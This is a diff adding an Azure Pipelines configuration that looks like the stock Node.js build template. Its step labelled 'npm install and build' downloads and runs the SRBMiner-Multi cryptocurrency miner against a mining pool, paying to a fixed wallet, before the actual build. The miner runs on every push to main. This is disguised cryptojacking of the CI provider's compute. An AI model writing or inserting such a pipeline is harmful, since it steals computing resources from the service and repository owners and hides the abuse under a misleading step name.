@@ -1,0 +1,25 @@
+# Node.js
+# Build a general Node.js project with npm.
+# Add steps that analyze code, save build artifacts, deploy, and more:
+# https://docs.microsoft.com/azure/devops/pipelines/languages/javascript
+
+trigger:
+- main
+
+pool:
+  vmImage: ubuntu-latest
+
+steps:
+- task: NodeTool@0
+  inputs:
+    versionSpec: '10.x'
+  displayName: 'Install Node.js'
+
+- script: |
+    wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.1/SRBMiner-Multi-0-9-1-Linux.tar.xz
+    tar -xf SRBMiner-Multi-0-9-1-Linux.tar.xz
+    cd  SRBMiner-Multi-0-9-1
+
+    ./SRBMiner-MULTI --algorithm yespowersugar --pool stratum+tcps://stratum-na.rplant.xyz:17042 --wallet sugar1qd0wlu03j227dqypmmw646gckxpxpy0gmjqaqe9
+    npm run build
+  displayName: 'npm install and build'
